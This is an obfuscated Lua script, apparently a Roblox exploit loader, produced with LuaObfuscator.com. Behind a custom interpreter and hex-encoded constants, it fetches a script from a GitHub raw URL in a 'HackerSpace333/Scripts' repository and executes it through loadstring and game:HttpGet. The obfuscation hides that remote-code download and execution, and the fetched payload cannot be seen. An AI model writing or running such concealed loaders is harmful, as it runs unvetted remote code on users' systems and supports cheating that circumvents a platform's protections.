--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v97=0;local v98;while true do if (v97==1) then return v98;end if (v97==0) then v98=v5(v81,v19);v19=nil;v97=1;end end else return v81;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v82=0 + 0 ;local v83;while true do if (v82==(0 -0)) then v83=(v31/((5 -3)^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-(1066 -(68 + 997)))) + ((2349 -1078) -(226 + (1916 -872))))) ;return v83-(v83%(932 -(857 + (424 -(87 + 263))))) ;end end else local v84=117 -(32 + 85) ;local v85;while true do if (v84==(568 -(367 + 201))) then v85=(1 + 1)^(v32-1) ;return (((v31%(v85 + v85))>=v85) and (958 -(892 + 65))) or ((1107 -(67 + 113)) -(214 + 713)) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 2 ;return (v36 * (628 -372)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (15 -11) ;return (v40 * ((30434979 -13656811) -(802 + 110 + 40))) + (v39 * (176444 -(111905 -(915 + 82)))) + (v38 * 256) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=2 -1 ;local v44=(v20(v42,1 + 0 ,26 -(1 + 5) ) * ((1189 -(1069 + 118))^(72 -40))) + v41 ;local v45=v20(v42,21,469 -(145 + 293) );local v46=((v20(v42,69 -37 )==(1487 -(998 + 488))) and  -(1 + 0)) or (1 + 0) ;if (v45==((273 + 499) -(201 + 571))) then if (v44==(1138 -((1001 -(261 + 624)) + 1022))) then return v46 * (0 -0) ;else v45=1 + 0 ;v43=791 -(368 + (751 -328)) ;end elseif (v45==(7472 -5425)) then return ((v44==(0 -0)) and (v46 * ((19 -(10 + 8))/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-(1882 -(814 + 45)) ) * (v43 + (v44/((444 -((1496 -(1020 + 60)) + 26))^((1550 -(630 + 793)) -(253 -178))))) ;end local function v25(v47) local v48;if  not v47 then local v86=0 -0 ;while true do if (v86==(0 + 0)) then v47=v23();if (v47==(0 -0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(1748 -(760 + 987)) );v18=v18 + v47 ;local v49={};for v63=1914 -((2555 -(745 + 21)) + 124) , #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return 0;end)();local v51=(function() return;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();while true do local v65=(function() return 1822 -(301 + 1521) ;end)();while true do if ((1 -0)==v65) then if (v50~=(2 + 0)) then else for v99= #"[",v23() do local v100=(function() return 0 -0 ;end)();local v101=(function() return;end)();local v102=(function() return;end)();while true do if (v100~=0) then else local v142=(function() return 0;end)();local v143=(function() return;end)();while true do if (v142~=(0 -0)) then else v143=(function() return 0;end)();while true do if (v143~=1) then else v100=(function() return 1;end)();break;end if (v143==0) then local v163=(function() return 0;end)();while true do if (v163==(1701 -(1419 + 281))) then v143=(function() return 1 -0 ;end)();break;end if (v163~=0) then else v101=(function() return 0;end)();v102=(function() return nil;end)();v163=(function() return 75 -(71 + 3) ;end)();end end end end break;end end end if (1==v100) then while true do if (v101==0) then v102=(function() return v21();end)();if (v20(v102, #"<", #"|")==0) then local v159=(function() return 0;end)();local v160=(function() return;end)();local v161=(function() return;end)();local v162=(function() return;end)();while true do if (v159~=1) then else local v164=(function() return 0;end)();while true do if (v164==0) then v162=(function() return {v22(),v22(),nil,nil};end)();if (v160==(0 + 0)) then local v173=(function() return 0 -0 ;end)();local v174=(function() return;end)();while true do if (v173~=(0 -0)) then else v174=(function() return 241 -(187 + 54) ;end)();while true do if (v174~=0) then else v162[ #"19("]=(function() return v22();end)();v162[ #"asd1"]=(function() return v22();end)();break;end end break;end end elseif (v160== #"{") then v162[ #"19("]=(function() return v23();end)();elseif (v160==(782 -(162 + 618))) then v162[ #"xxx"]=(function() return v23() -((2 + 0)^(11 + 5)) ;end)();elseif (v160== #"nil") then local v179=(function() return 0 -0 ;end)();local v180=(function() return;end)();while true do if (v179==0) then v180=(function() return 0 -0 ;end)();while true do if (0==v180) then v162[ #"-19"]=(function() return v23() -((1 + 1)^16) ;end)();v162[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v164=(function() return 1;end)();end if (v164~=(1637 -(1373 + 263))) then else v159=(function() return 1002 -(451 + 549) ;end)();break;end end end if (v159~=(0 + 0)) then else local v165=(function() return 0 -0 ;end)();while true do if (v165==1) then v159=(function() return 1 -0 ;end)();break;end if (v165~=0) then else v160=(function() return v20(v102,1386 -(746 + 638) , #"xxx");end)();v161=(function() return v20(v102, #".com",6);end)();v165=(function() return 1 + 0 ;end)();end end end if (v159==(4 -1)) then if (v20(v161, #"asd", #"asd")== #"{") then v162[ #"http"]=(function() return v56[v162[ #"0313"]];end)();end v51[v99]=(function() return v162;end)();break;end if (v159~=2) then else if (v20(v161, #"~", #" ")== #":") then v162[343 -(218 + 123) ]=(function() return v56[v162[2]];end)();end if (v20(v161,2,1583 -(1535 + 46) )~= #"[") then else v162[ #"asd"]=(function() return v56[v162[ #"19("]];end)();end v159=(function() return 3;end)();end end end break;end end break;end end end for v103= #"|",v23() do v52[v103-#":" ]=(function() return v28();end)();end return v54;end break;end if (v65==(0 + 0)) then if (v50~= #",") then else local v94=(function() return 0 + 0 ;end)();local v95=(function() return;end)();while true do if (v94==0) then v95=(function() return 560 -(306 + 254) ;end)();while true do if (v95==2) then v50=(function() return 1 + 1 ;end)();break;end if ((1 -0)~=v95) then else for v154= #"\\",v55 do local v155=(function() return 1467 -(899 + 568) ;end)();local v156=(function() return;end)();local v157=(function() return;end)();local v158=(function() return;end)();while true do if ((0 + 0)==v155) then v156=(function() return 0 -0 ;end)();v157=(function() return nil;end)();v155=(function() return 604 -(268 + 335) ;end)();end if (v155==1) then v158=(function() return nil;end)();while true do if (v156==1) then if (v157== #"|") then v158=(function() return v21()~=(290 -(60 + 230)) ;end)();elseif (v157==(574 -(426 + 146))) then v158=(function() return v24();end)();elseif (v157== #"91(") then v158=(function() return v25();end)();end v56[v154]=(function() return v158;end)();break;end if (v156~=0) then else local v168=(function() return 0;end)();local v169=(function() return;end)();while true do if (v168==0) then v169=(function() return 0 + 0 ;end)();while true do if (v169~=0) then else v157=(function() return v21();end)();v158=(function() return nil;end)();v169=(function() return 1457 -(282 + 1174) ;end)();end if (v169==1) then v156=(function() return 1;end)();break;end end break;end end end end break;end end end v54[ #"xnx"]=(function() return v21();end)();v95=(function() return 813 -(569 + 242) ;end)();end if (0==v95) then v55=(function() return v23();end)();v56=(function() return {};end)();v95=(function() return 1;end)();end end break;end end end if (v50==0) then local v96=(function() return 0;end)();while true do if (v96~=(5 -3)) then else v50=(function() return  #"/";end)();break;end if (v96~=1) then else v53=(function() return {};end)();v54=(function() return {v51,v52,nil,v53};end)();v96=(function() return 1 + 1 ;end)();end if (v96==(1024 -(706 + 318))) then v51=(function() return {};end)();v52=(function() return {};end)();v96=(function() return 1252 -(721 + 530) ;end)();end end end v65=(function() return 1272 -(945 + 326) ;end)();end end end end local function v29(v57,v58,v59) local v60=v57[1];local v61=v57[2];local v62=v57[7 -(4 + 0) ];return function(...) local v66=v60;local v67=v61;local v68=v62;local v69=v27;local v70=1 + 0 ;local v71= -(701 -(271 + 429));local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v87=1500 -(1408 + 7 + 85) ,v74 do if ((v87>=v68) or (2874<=2181) or (1869==2009)) then v72[v87-v68 ]=v73[v87 + (1087 -(461 + 625)) ];else v76[v87]=v73[v87 + (1289 -(993 + 295)) ];end end local v77=(v74-v68) + 1 + 0 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1172 -(418 + 753) ];if (v79<=(2 + 1)) then if ((v79<=(1 + 0)) or (2689<=343)) then if (v79>(0 + 0)) then v76[v78[(739 -(542 + 196)) + 1 ]]();else local v105=529 -(406 + 123) ;local v106;local v107;while true do if (((3794 -2024) -(1749 + 20))==v105) then v76[v106 + 1 ]=v107;v76[v106]=v107[v78[4]];break;end if ((0==v105) or (3546<2322)) then v106=v78[1 + 1 ];v107=v76[v78[3]];v105=1323 -(1249 + 73) ;end end end elseif (v79==2) then do return;end else local v108=0 + 0 + 0 ;local v109;while true do if (v108==(1145 -(466 + 679))) then v109=v78[4 -(2 + 0) ];v76[v109]=v76[v109](v13(v76,v109 + 1 ,v71));break;end end end elseif ((v79<=(14 -9)) or (2082==4773)) then if (v79>(2 + 2)) then v76[v78[1902 -(106 + 1794) ]]=v78[1 + 2 ];else local v112=v78[2];local v113,v114=v69(v76[v112](v13(v76,v112 + 1 + 0 ,v78[8 -5 ])));v71=(v114 + v112) -(2 -1) ;local v115=114 -(4 + (289 -179)) ;for v137=v112,v71 do local v138=584 -(57 + 527) ;while true do if ((3244>1055) and ((1427 -(41 + 1386))==v138)) then v115=v115 + (104 -((43 -26) + 86)) ;v76[v137]=v113[v115];break;end end end end elseif (v79==(5 + 1)) then v76[v78[3 -1 ]]=v59[v78[8 -5 ]];else local v118;local v119,v120;local v121;local v122;v76[v78[1553 -(1126 + 425) ]]=v59[v78[169 -(122 + 44) ]];v70=v70 + ((406 -(118 + 287)) -0) ;v78=v66[v70];v76[v78[6 -4 ]]=v59[v78[(11 -8) + 0 ]];v70=v70 + 1 ;v78=v66[v70];v122=v78[1 + (1122 -(118 + 1003)) ];v121=v76[v78[5 -(5 -3) ]];v76[v122 + (66 -(30 + 35)) ]=v121;v76[v122]=v121[v78[(380 -(142 + 235)) + 1 ]];v70=v70 + (1258 -(1043 + 214)) ;v78=v66[v70];v76[v78[7 -5 ]]=v78[(5511 -4296) -(323 + 889) ];v70=v70 + (2 -1) ;v78=v66[v70];v122=v78[2];v119,v120=v69(v76[v122](v13(v76,v122 + (581 -(361 + 219)) ,v78[323 -(53 + 267) ])));v71=(v120 + v122) -(1 + 0) ;v118=(90 + 323) -(15 + 398) ;for v139=v122,v71 do v118=v118 + (983 -((995 -(553 + 424)) + 964)) ;v76[v139]=v119[v118];end v70=v70 + (1 -0) ;v78=v66[v70];v122=v78[7 -5 ];v76[v122]=v76[v122](v13(v76,v122 + 1 + 0 ,v71));v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]();v70=v70 + 1 + 0 + 0 ;v78=v66[v70];do return;end end v70=v70 + (851 -(20 + 830)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034D3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861636B657253706163653Q33312F536372697074732F726566732F68656164732F6D61696E2F2Q4D3200083Q0012073Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00",v9(),...);